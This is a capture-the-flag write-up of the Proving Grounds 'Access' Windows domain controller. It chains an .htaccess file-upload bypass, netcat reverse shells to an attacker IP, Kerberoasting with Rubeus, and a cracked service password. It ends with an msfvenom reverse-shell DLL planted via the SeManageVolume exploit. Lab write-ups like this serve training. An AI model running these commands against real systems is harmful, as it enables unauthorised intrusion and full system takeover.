---
title: "PG Play: Access"
created: "2023-08-16"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "Access"
os: Windows
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - windows
  - ctf
  - oscp
  - reverse-shell
  - file-upload-exploitation
  - file-upload
  - hash-cracking-john
  - msfvenom-payload
related:
  - "[[Reverse-Shell-Reference]]"
  - "[[File-Upload-to-RCE-Patterns]]"
  - "[[Password-Cracking-Methodology]]"
  - "[[Kerberoasting-Attack-Chain]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: Access

> **Platform:** Proving Grounds Play | **OS:** Windows | **Date:** 2023-08-16

---

## Quick Summary

**Open Ports:**
- 53/tcp (domain)
- 80/tcp (http)
- 88/tcp (kerberos-sec)
- 135/tcp (msrpc)
- 139/tcp (netbios-ssn)
- 389/tcp (ldap)
- 445/tcp (microsoft-ds?)
- 464/tcp (kpasswd5?)
- 593/tcp (ncacn_http)
- 636/tcp (tcpwrapped)
- 3268/tcp (ldap)
- 3269/tcp (tcpwrapped)
- 5985/tcp (http)
- 9389/tcp (mc-nmf)
- 49666/tcp (msrpc)

**Key Techniques:**
- Reverse Shell
- File Upload Exploitation
- File Upload
- Hash Cracking (John)
- msfvenom Payload
- Kerberoasting
- Rubeus (Kerberos)
- Netcat
- SeManageVolumePrivilege
- DLL Hijacking

**Privilege Escalation Path:**
- (See walkthrough)

---

## Full Walkthrough

Proving grounds Practice - Access CTF writeup.


[*(screenshot)*](https://youtu.be/h1Br5umYxwc)

## Nmap

```sh
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-16 07:12:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49773/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Fuzzing

### Directories

```text
/uploads
/assets
/icons
/forms
```                                

## File Upload Vulnerability


Upload a `.htaccess` file to overwrite the file upload configuration in the apache.

**Content of .htacess file**

```text
AddType application/x-httpd-php .evil
```

Upload the php remote code execution code to the server with extension as `rce.evil`


### RCE


- Upload netcat windows binary to the server.
- Obtain reverse shell by executing netcat command.


- Transfer PowerView.ps1 to the attacking machine.

**Extract Users Information**

```text
-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```

## Kerberos Abuse

The user `svc_mssql` has Service Principal Name, hence kerberoasting takes place.

```text
serviceprincipalname          : MSSQLSvc/DC.access.offsec
```

[Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

Run as below to obtain NTLM Hash.

```powershell
PS C:\xampp\tmp> .\Rubeus.exe kerberoast /nowrap
```

Copy the hash and crack it using john.

**Crack the hash**


Transfer [Invoke-Runas.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1) to the attacking machine. The script will allow us to run commands as certain users in the system using the username and password.

Obtain revese shell for user `svc_mssql` by using the invoke command to trigger the netcat reverse shell.

```powershell
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 'C:\xampp\htdocs\uploads\nc.exe <IP> 4444 -e cmd.exe'
```


## Privilege Escalation

**Abuse SeChangeNotifyPrivilege.**

```powershell
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

Bypass traverse checking allows us to perform seManageVolumeAbuse by performing dll hijacking.

[SeManageVolumeAbuse](https://github.com/CsEnox/SeManageVolumeExploit)

Transfer the binary to the remote machine and run as `svc_mssql` user.

```powershell
PS C:\xampp\tmp> .\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 916
DONE 
```

Create a dll file with windows reverse shell.

```sh
msfvenom -f dll -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=9090 -o Printconfig.dll
```

Transfer the dll file to the attacking machine and overwrite the file to the below location.

`C:\Windows\system32\spool\drivers\x64\3\Printconfig.dll`


Switch to powershell and use the below trigger to obtain root.

```powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```
[More...](https://github.com/CsEnox/SeManageVolumeExploit)


**Root shell Obtained**

---

## Technique Links

- [[Reverse-Shell-Reference]]
- [[File-Upload-to-RCE-Patterns]]
- [[Password-Cracking-Methodology]]
- [[Kerberoasting-Attack-Chain]]
- [[Windows-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
